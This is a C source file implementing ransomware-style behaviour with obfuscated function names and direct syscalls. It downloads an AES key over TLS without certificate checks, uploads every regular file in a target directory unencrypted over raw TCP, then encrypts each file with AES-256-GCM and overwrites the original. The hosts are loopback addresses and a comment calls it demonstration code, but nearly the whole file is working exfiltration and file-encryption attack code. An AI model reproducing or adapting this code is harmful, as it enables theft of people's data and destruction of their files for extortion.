#include <stdio.h>  // For printf
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/x509.h>
#include <openssl/x509_vfy.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
// -----------------------------------------------------------------------------
// 1) Minimal syscall wrappers (read, write, open, close, exit, getdents64)
//
// Limitations of this approach:
//  - Uses direct syscalls via inline assembly, bypassing the standard C library
//    buffering and convenience functions.
//  - Tightly coupled to x86-64 Linux syscalls and ABI. Not portable to other OS
//    or architectures without changes.
//  - Lacks robust error handling (e.g., no retries on EINTR).
//  - Does not handle advanced functionality like asynchronous I/O or offset-based I/O.
//  - The code is purely demonstration-level and not production-grade.
// -----------------------------------------------------------------------------
*/
static inline long xyq_sc3(long x1, long x2, long x3, long x4)
{
    long xr;
    __asm__ volatile (
        "movq %1, %%rax   \n\t"
        "movq %2, %%rdi   \n\t"
        "movq %3, %%rsi   \n\t"
        "movq %4, %%rdx   \n\t"
        "syscall          \n\t"
        "movq %%rax, %0   \n\t"
        : "=r"(xr)
        : "r"(x1), "r"(x2), "r"(x3), "r"(x4)
        : "rax","rdi","rsi","rdx","memory"
    );
    return xr;
}

static inline long xyq_sc2(long x1, long x2, long x3)
{
    long xr;
    __asm__ volatile (
        "movq %1, %%rax   \n\t"
        "movq %2, %%rdi   \n\t"
        "movq %3, %%rsi   \n\t"
        "syscall          \n\t"
        "movq %%rax, %0   \n\t"
        : "=r"(xr)
        : "r"(x1), "r"(x2), "r"(x3)
        : "rax","rdi","rsi","memory"
    );
    return xr;
}

static inline long xyq_sc1(long x1, long x2)
{
    long xr;
    __asm__ volatile (
        "movq %1, %%rax   \n\t"
        "movq %2, %%rdi   \n\t"
        "syscall          \n\t"
        "movq %%rax, %0   \n\t"
        : "=r"(xr)
        : "r"(x1), "r"(x2)
        : "rax","rdi","memory"
    );
    return xr;
}

#define XYQ_READ  0
#define XYQ_WRIT  1
#define XYQ_OPN   2
#define XYQ_CLS   3
#define XYQ_EXI   60
#define XYQ_GDT   217

#define XYQ_RONLY 0
#define XYQ_WONLY 1
#define XYQ_CRT   64
#define XYQ_TRN   512
#define XYQ_DIR   0200000

static inline long xyq_opn(const char* pz, long fz, long mz)
{
    return xyq_sc3(XYQ_OPN, (long)pz, fz, mz);
}
static inline long xyq_r(long fd, void* bf, long ct)
{
    return xyq_sc3(XYQ_READ, fd, (long)bf, ct);
}
static inline long xyq_w(long fd, const void* bf, long ct)
{
    return xyq_sc3(XYQ_WRIT, fd, (long)bf, ct);
}
static inline long xyq_cl(long fd)
{
    return xyq_sc1(XYQ_CLS, fd);
}

// Exit wrapper
static inline void xyq_ex(long cd)
{
    printf("[!] Exiting with code %ld\n", cd);
    xyq_sc1(XYQ_EXI, cd);
    __builtin_unreachable();
}

static inline long xyq_gd(long fd, void* dp, long ct)
{
    return xyq_sc3(XYQ_GDT, fd, (long)dp, ct);
}

// -----------------------------------------------------------------------------
// 2) AES-256 Key Schedule + Single-Block AES-NI Encryption
// -----------------------------------------------------------------------------
static const unsigned char Z1[256] = {
  0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
  0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
  0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
  0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
  0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
  0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
  0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
  0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
  0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
  0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
  0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
  0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
  0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
  0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
  0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
  0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

static const unsigned int Z2[15] = {
    0x00000000,
    0x01000000,
    0x02000000,
    0x04000000,
    0x08000000,
    0x10000000,
    0x20000000,
    0x40000000,
    0x80000000,
    0x1B000000,
    0x36000000,
    0x6C000000,
    0xD8000000,
    0xAB000000,
    0x4D000000
};

static inline unsigned int Q1(unsigned int w)
{
    return ((w << 8) & 0xFFFFFFFF) | (w >> 24);
}

static inline unsigned int Q2(unsigned int w)
{
    return
        ((unsigned int)Z1[(w >> 24) & 0xFF] << 24) |
        ((unsigned int)Z1[(w >> 16) & 0xFF] << 16) |
        ((unsigned int)Z1[(w >>  8) & 0xFF] <<  8) |
        ((unsigned int)Z1[(w      ) & 0xFF]);
}

static void Q3(const unsigned char *kk, unsigned char rr[15][16])
{
    printf("[+] Expanding AES-256 key...\n");
    unsigned int ww[60];
    int aa;

    // Copy key into ww[0..7]
    for (aa = 0; aa < 8; aa++) {
        ww[aa] = ((unsigned int)kk[4*aa  ] << 24) |
                 ((unsigned int)kk[4*aa+1] << 16) |
                 ((unsigned int)kk[4*aa+2] <<  8) |
                 ((unsigned int)kk[4*aa+3]);
    }

    // Expand to 60 words
    for (aa = 8; aa < 60; aa++) {
        unsigned int tt = ww[aa - 1];
        if ((aa % 8) == 0) {
            tt = Q2(Q1(tt)) ^ Z2[aa/8];
        } else if ((aa % 8) == 4) {
            tt = Q2(tt);
        }
        ww[aa] = ww[aa - 8] ^ tt;
    }

    // Store into rr
    for (int ra = 0; ra < 15; ra++) {
        for (int bb = 0; bb < 4; bb++) {
            unsigned int tt = ww[ra*4 + bb];
            rr[ra][4*bb + 0] = (unsigned char)(tt >> 24);
            rr[ra][4*bb + 1] = (unsigned char)(tt >> 16);
            rr[ra][4*bb + 2] = (unsigned char)(tt >>  8);
            rr[ra][4*bb + 3] = (unsigned char)(tt      );
        }
    }
}

static void Q4(unsigned char blk[16], const unsigned char rr[15][16])
{
    // Single-block AES encryption w/ AES-NI
    __asm__ volatile (
      ".intel_syntax noprefix           \n\t"
      "movdqu xmm0, [rdi]              \n\t"
      "movdqu xmm1, [rsi]              \n\t"
      "pxor xmm0, xmm1                 \n\t"

      "movdqu xmm1, [rsi + 16]         \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 32]         \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 48]         \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 64]         \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 80]         \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 96]         \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 112]        \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 128]        \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 144]        \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 160]        \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 176]        \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 192]        \n\t"
      "aesenc xmm0, xmm1               \n\t"
      "movdqu xmm1, [rsi + 208]        \n\t"
      "aesenc xmm0, xmm1               \n\t"

      "movdqu xmm1, [rsi + 224]        \n\t"
      "aesenclast xmm0, xmm1           \n\t"

      "movdqu [rdi], xmm0              \n\t"
      ".att_syntax prefix              \n\t"
      :
      : "D"(blk), "S"(rr)
      : "xmm0", "xmm1", "memory"
    );
}

// -----------------------------------------------------------------------------
// 3) Minimal GCM Implementation
// -----------------------------------------------------------------------------
static inline void Q5(unsigned char *dd, const unsigned char *ss)
{
    for (int pp = 0; pp < 16; pp++) {
        dd[pp] ^= ss[pp];
    }
}

static void Q6(const unsigned char *XX, const unsigned char *YY, unsigned char *RR)
{
    unsigned char ZZ[16];
    unsigned char VV[16];
    for (int pp = 0; pp < 16; pp++) {
        ZZ[pp] = 0;
        VV[pp] = XX[pp];
    }

    for (int pp = 0; pp < 128; pp++) {
        int bi = pp >> 3;
        int sh = 7 - (pp & 7);
        unsigned char mk = (unsigned char)(1 << sh);

        if (YY[bi] & mk) {
            Q5(ZZ, VV);
        }
        unsigned char cy = VV[0] & 0x80;
        for (int bb = 0; bb < 15; bb++) {
            VV[bb] = (unsigned char)((VV[bb] << 1) | (VV[bb+1] >> 7));
        }
        VV[15] <<= 1;
        if (cy) {
            VV[15] ^= 0x87;
        }
    }
    for (int pp = 0; pp < 16; pp++) {
        RR[pp] = ZZ[pp];
    }
}

static void Q7(unsigned char aa[16],
               const unsigned char hh[16],
               const unsigned char bb[16])
{
    unsigned char tt[16];
    for (int pp = 0; pp < 16; pp++) {
        tt[pp] = aa[pp] ^ bb[pp];
    }
    Q6(tt, hh, aa);
}

static void Q8(
    unsigned char *bb,
    long ll,
    const unsigned char rr[15][16],
    unsigned char JJ[16],
    const unsigned char HH[16],
    unsigned char GG[16]
)
{
    unsigned char cc[16];
    long pr = 0;

    printf("[*] Q8: Starting chunk encryption. Total %ld bytes to process.\n", ll);

    while (pr < ll) {
        for (int pp = 0; pp < 16; pp++) {
            cc[pp] = JJ[pp];
        }
        Q4(cc, rr);

        long bl = 16;
        if (bl > (ll - pr)) {
            bl = ll - pr;
        }
        for (int mm = 0; mm < bl; mm++) {
            bb[pr + mm] ^= cc[mm];
        }

        unsigned char tmp[16];
        for (int mm = 0; mm < 16; mm++) {
            if (mm < bl) tmp[mm] = bb[pr + mm];
            else tmp[mm] = 0;
        }
        Q7(GG, HH, tmp);

        // increment JJ
        JJ[15]++;
        if (JJ[15] == 0) {
            JJ[14]++;
            if (JJ[14] == 0) {
                JJ[13]++;
                if (JJ[13] == 0) {
                    JJ[12]++;
                }
            }
        }
        pr += bl;
    }
}

static void Q9(
    long ln,
    const unsigned char rr[15][16],
    const unsigned char HH[16],
    unsigned char JJ0[16],
    unsigned char GG[16],
    unsigned char OT[16]
)
{
    printf("[*] Q9: Finalizing GCM tag for %ld bytes\n", ln);

    unsigned char lnblk[16];
    for (int pp = 0; pp < 16; pp++) lnblk[pp] = 0;

    unsigned long long cbb = (unsigned long long)ln * 8ULL;
    lnblk[8]  = (unsigned char)(cbb >> 56);
    lnblk[9]  = (unsigned char)(cbb >> 48);
    lnblk[10] = (unsigned char)(cbb >> 40);
    lnblk[11] = (unsigned char)(cbb >> 32);
    lnblk[12] = (unsigned char)(cbb >> 24);
    lnblk[13] = (unsigned char)(cbb >> 16);
    lnblk[14] = (unsigned char)(cbb >>  8);
    lnblk[15] = (unsigned char)(cbb);

    Q7(GG, HH, lnblk);

    unsigned char SS[16];
    for (int pp = 0; pp < 16; pp++) {
        SS[pp] = JJ0[pp];
    }
    Q4(SS, rr);

    for (int pp = 0; pp < 16; pp++) {
        OT[pp] = (unsigned char)(SS[pp] ^ GG[pp]);
    }
}

/**
 * Q10 encrypts file "pi" into file "po" (AES-GCM).
 */
static void Q10(const char* pi, const char* po, const unsigned char rr[15][16])
{
    printf("[+] Encrypting file from %s to %s\n", pi, po);

    long fd1 = xyq_opn(pi, XYQ_RONLY, 0);
    printf("    -> Input file descriptor = %ld\n", fd1);
    if (fd1 < 0) {
        printf("[!] Cannot open input file %s\n", pi);
        return;
    }

    // We create or truncate the destination file
    long fd2 = xyq_opn(po, XYQ_WONLY | XYQ_CRT | XYQ_TRN, 0644);
    printf("    -> Output file descriptor = %ld\n", fd2);
    if (fd2 < 0) {
        printf("[!] Cannot open output file %s\n", po);
        xyq_cl(fd1);
        return;
    }

    // Set up the IV
    unsigned char jj[16];
    for (int pp = 0; pp < 16; pp++) {
        jj[pp] = 0;
    }
    // 96-bit random IV (12 bytes from /dev/urandom, fallback if not available)
    long ur = xyq_opn("/dev/urandom", XYQ_RONLY, 0);
    if (ur >= 0) {
        xyq_r(ur, jj, 12);
        xyq_cl(ur);
        printf("    -> IV loaded from /dev/urandom\n");
    } else {
        printf("[!] Failed to open /dev/urandom, using default IV of zeros!\n");
    }
    jj[12] = 0x00;
    jj[13] = 0x00;
    jj[14] = 0x00;
    jj[15] = 0x01;

    // Write first 12 bytes of IV into the output file
    xyq_w(fd2, jj, 12);
    printf("    -> Wrote IV (12 bytes) to output\n");

    // Save a copy of the IV as JJ0 for final tag step
    unsigned char jj0[16];
    for (int pp = 0; pp < 16; pp++) {
        jj0[pp] = jj[pp];
    }

    // Compute H = AES_enc(0...0)
    unsigned char hh[16];
    for (int pp = 0; pp < 16; pp++) hh[pp] = 0;
    Q4(hh, rr);
    printf("    -> GCM H value computed.\n");

    // GHASH accumulator
    unsigned char gg[16];
    for (int pp = 0; pp < 16; pp++) gg[pp] = 0;

    unsigned char buf[4096];
    long tenc = 0;

    printf("    -> Starting encryption loop...\n");
    for (;;) {
        long rd = xyq_r(fd1, buf, sizeof(buf));
        if (rd <= 0) {
            printf("    -> Finished reading input or error: rd = %ld\n", rd);
            break;
        }
        // Encrypt buffer in place
        Q8(buf, rd, rr, jj, hh, gg);

        // Write encrypted chunk
        xyq_w(fd2, buf, rd);

        tenc += rd;
    }

    unsigned char tg[16];
    // Finalize tag
    Q9(tenc, rr, hh, jj0, gg, tg);

    // Write the 16-byte tag
    xyq_w(fd2, tg, 16);
    printf("    -> Wrote GCM tag (16 bytes) to output\n");

    xyq_cl(fd1);
    xyq_cl(fd2);
}

// -----------------------------------------------------------------------------
// 4) Directory reading + path utils
// -----------------------------------------------------------------------------
struct XYQ_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

static int Q12(const char* zz)
{
    int rr = 0;
    while (zz[rr]) {
        rr++;
    }
    return rr;
}

static void Q13(char* dd, const char* xx, const char* yy)
{
    int ii = 0;
    for (; xx[ii]; ii++) {
        dd[ii] = xx[ii];
    }
    if (ii > 0 && xx[ii-1] != '/') {
        dd[ii++] = '/';
    }
    int jj = 0;
    for (; yy[jj]; jj++) {
        dd[ii + jj] = yy[jj];
    }
    dd[ii + jj] = '\0';
}

// -----------------------------------------------------------------------------
// 5) Socket-based upload (raw TCP), unchanged
// -----------------------------------------------------------------------------
#define XYQ_AFINT   2
#define XYQ_SSTRM   1

static inline unsigned short xyq_htn(unsigned short xx)
{
    return (unsigned short)(((xx & 0xff) << 8) | (xx >> 8));
}

static inline unsigned int xyq_itn(unsigned char a, unsigned char b,
                            unsigned char c, unsigned char d)
{
    return ((unsigned int)a << 24) |
           ((unsigned int)b << 16) |
           ((unsigned int)c <<  8) |
           (unsigned int)d;
}

static long xyq_so(long domain, long type, long protocol)
{
    return xyq_sc3(41, domain, type, protocol);
}
static long xyq_co(long sd, const void *ad, unsigned long al)
{
    return xyq_sc3(42, sd, (long)ad, al);
}

struct XYQ_sockaddr_in {
    unsigned short xyq_sfam;
    unsigned short xyq_spor;
    unsigned int   xyq_sadr;
    unsigned char  xyq_szer[8];
};

static void Q14(const char *ppp,
                unsigned char aa, unsigned char bb,
                unsigned char cc, unsigned char dd,
                unsigned short pt)
{
    printf("[+] Uploading file %s to %u.%u.%u.%u:%u\n", ppp, aa, bb, cc, dd, pt);

    long fdi = xyq_opn(ppp, XYQ_RONLY, 0);
    printf("    -> Input file descriptor = %ld\n", fdi);
    if (fdi < 0) {
        printf("[!] Cannot open file for upload: %s\n", ppp);
        return;
    }

    long sfd = xyq_so(XYQ_AFINT, XYQ_SSTRM, 0);
    printf("    -> Socket descriptor = %ld\n", sfd);
    if (sfd < 0) {
        printf("[!] Failed to create socket.\n");
        xyq_cl(fdi);
        return;
    }

    struct XYQ_sockaddr_in ssa;
    for (int ii = 0; ii < (int)sizeof(ssa); ii++) {
        ((char*)&ssa)[ii] = 0;
    }
    ssa.xyq_sfam = XYQ_AFINT;
    ssa.xyq_spor = xyq_htn(pt);
    ssa.xyq_sadr = xyq_itn(aa, bb, cc, dd);

    long cst = xyq_co(sfd, &ssa, sizeof(ssa));
    printf("    -> Connect status = %ld\n", cst);
    if (cst < 0) {
        printf("[!] Failed to connect.\n");
        xyq_cl(fdi);
        xyq_cl(sfd);
        return;
    }

    // Send file data
    unsigned char buf[4096];
    for (;;) {
        long nr = xyq_r(fdi, buf, sizeof(buf));
        if (nr <= 0) {
            printf("    -> Read done or error: nr = %ld\n", nr);
            break;
        }
        long stt = 0;
        while (stt < nr) {
            long sn = xyq_w(sfd, buf + stt, nr - stt);
            if (sn < 0) {
                printf("[!] Write error.\n");
                xyq_cl(fdi);
                xyq_cl(sfd);
                return;
            }
            stt += sn;
        }
    }

    xyq_cl(fdi);
    xyq_cl(sfd);
    printf("    -> Upload finished.\n");
}

// -----------------------------------------------------------------------------
// 6) TLS-based key download (OpenSSL). Same logic, omitted certificate checks
// -----------------------------------------------------------------------------
static int Q16_tls(unsigned char *out_key32)
{
    printf("[+] Setting up TLS client...\n");
    SSL_load_error_strings();
    ERR_load_BIO_strings();
    OpenSSL_add_ssl_algorithms();

    const SSL_METHOD *method = TLS_client_method();
    if (!method) {
        printf("[!] TLS_client_method() failed\n");
        return -1;
    }

    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) {
        printf("[!] SSL_CTX_new() failed\n");
        return -2;
    }

    // Skipping certificate verification for demo
    SSL *ssl;
    BIO *bio = BIO_new_ssl_connect(ctx);
    if (!bio) {
        printf("[!] BIO_new_ssl_connect() failed\n");
        SSL_CTX_free(ctx);
        return -3;
    }
    BIO_set_conn_hostname(bio, "127.0.0.1:9999");

    BIO_get_ssl(bio, &ssl);
    if (!ssl) {
        printf("[!] BIO_get_ssl() failed\n");
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        return -4;
    }

    printf("    -> Connecting to 127.0.0.1:9999\n");
    if (BIO_do_connect(bio) <= 0) {
        printf("[!] BIO_do_connect() failed\n");
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        return -5;
    }

    // Attempt to read 32 bytes
    int ret = BIO_read(bio, out_key32, 32);
    printf("    -> BIO_read() returned %d\n", ret);

    BIO_free_all(bio);
    SSL_CTX_free(ctx);

    if (ret < 32) {
        printf("[!] Did not receive full 32-byte key\n");
        return -6;
    }
    printf("[+] Successfully downloaded 32-byte key.\n");
    return 0;
}

// -----------------------------------------------------------------------------
// 7) main() - now we only take 1 argument: the input dir.
// -----------------------------------------------------------------------------
int main(int argc, char **argv)
{
    printf("[*] Program started. Expecting 1 argument: <input-dir>\n");

    // We expect at least 1 argument beyond argv[0]: input-dir
    if (argc < 2) {
        printf("[!] Not enough arguments. Usage: ./aes256_noimports <input-dir>\n");
        xyq_ex(1);
    }
    printf("[*] Input dir: %s\n", argv[1]);

    // 1) Download 32-byte key via TLS
    unsigned char m1[32];
    {
        printf("[*] Downloading 32-byte key via TLS...\n");
        int ret = Q16_tls(m1);
        if (ret < 0) {
            printf("[!] TLS key download failed with error %d\n", ret);
            xyq_ex(2);
        }
    }

    // 2) Build AES round keys
    unsigned char m2[15][16];
    Q3(m1, m2);

    // 3) Open input directory: argv[1]
    printf("[*] Opening input directory: %s\n", argv[1]);
    long fd3 = xyq_opn(argv[1], XYQ_DIR, 0);
    printf("    -> Directory fd3 = %ld\n", fd3);
    if (fd3 < 0) {
        printf("[!] Cannot open input directory.\n");
        xyq_ex(4);
    }

    // 4) Read directory, upload files, then encrypt in place
    char dbf[4096];
    printf("[*] Reading directory entries...\n");
    for (;;) {
        long nm = xyq_gd(fd3, dbf, sizeof(dbf));
        if (nm <= 0) {
            printf("[*] No more entries or error: nm = %ld\n", nm);
            break;
        }
        long bp = 0;
        while (bp < nm) {
            struct XYQ_dirent64 *dr = (struct XYQ_dirent64 *)(dbf + bp);
            char *nmz = dr->d_name;
            unsigned char dtp = dr->d_type;

            printf("    -> Found entry: %s (type: %u)\n", nmz, dtp);

            // If it's a regular file (type == 8)
            if (dtp == 8) {
                // Full path to the file in the input dir
                char pathFile[512];
                Q13(pathFile, argv[1], nmz);

                // 1) Upload the original file
                printf("[*] Uploading non-encrypted file: %s\n", pathFile);
                Q14(pathFile, 127, 0, 0, 1, 8080);

                // 2) Encrypt in place:
                //    We'll create a temporary file named "pathFile.enc",
                //    then rename it back to "pathFile" after encryption.
                char pathEnc[512];
                snprintf(pathEnc, sizeof(pathEnc), "%s.enc", pathFile);

                // Encrypt pathFile -> pathEnc
                printf("[*] Encrypting in place: %s -> %s\n", pathFile, pathEnc);
                Q10(pathFile, pathEnc, m2);

                // Overwrite the original file by renaming the encrypted
                // version back to the original path.
                int ren = rename(pathEnc, pathFile);
                if (ren < 0) {
                    printf("[!] rename(%s -> %s) failed\n", pathEnc, pathFile);
                } else {
                    printf("[*] Overwrote %s with encrypted data\n", pathFile);
                }
            }

            bp += dr->d_reclen;
        }
    }

    printf("[*] Closing directory.\n");
    xyq_cl(fd3);
    printf("[*] Done. Exiting with code 0.\n");
    xyq_ex(0);
    return 0; // Not reached due to xyq_ex
}
